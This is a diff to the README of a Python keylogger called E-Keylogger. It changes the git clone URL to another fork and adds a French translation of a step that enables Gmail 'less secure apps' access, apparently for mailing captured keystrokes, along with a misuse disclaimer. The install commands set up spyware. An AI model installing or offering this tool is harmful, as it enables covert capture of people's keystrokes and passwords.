@@ -9,7 +9,7 @@
 ### Instalar / Install
 
 ```
-• git clone https://github.com/R3LI4NT/E-Keylogger
+• git clone https://github.com/tucommenceapousser/E-Keylogger
 • cd E-Keylogger
 • pip3 install -r requirements.txt
 • python3 keylogger.py
@@ -27,3 +27,7 @@ Activate the access of less secure apps from your gmail account -> https://myacc
 
 I am not responsible for the misuse that may be given to this tool, use it for Pentesting or educational purposes.
 
+**`FR:`**
+activez l'accès aux applications moins sécurisées depuis votre compte Gmail -> https://myaccount.google.com/
+
+ Je ne suis pas responsable de la mauvaise utilisation qui pourrait être donnée à cet outil, utilisez-le à des fins de Pentesting ou à des fins éducatives.
